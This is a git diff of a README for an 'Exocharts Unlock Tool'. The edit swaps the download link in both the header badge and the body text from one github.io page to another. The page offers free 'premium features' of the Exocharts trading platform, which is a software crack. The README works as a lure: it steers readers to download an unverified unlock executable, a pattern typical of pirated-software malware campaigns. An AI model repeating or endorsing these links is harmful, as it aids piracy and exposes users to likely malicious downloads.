@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ Exocharts Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://exocharts-desktop-download.github.io/.github/" target="_blank">
+  <a href="https://exocharts-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Exocharts%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download Exocharts Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -95,7 +95,7 @@ Report issues or contribute via GitHub Issues or Pull Requests.
 ## ⭐️ Unlock Exocharts – Advanced Trading Visualization
 
 Unlock premium features of **Exocharts**, including **order flow, footprint charts, market profile, delta tracking, and volume clusters**.  
-[Download the Unlock Tool](https://exocharts-desktop-download.github.io/.github/) and trade with maximum precision.  
+[Download the Unlock Tool](https://exocharts-download.github.io/.github/) and trade with maximum precision.  
 
 ---
 
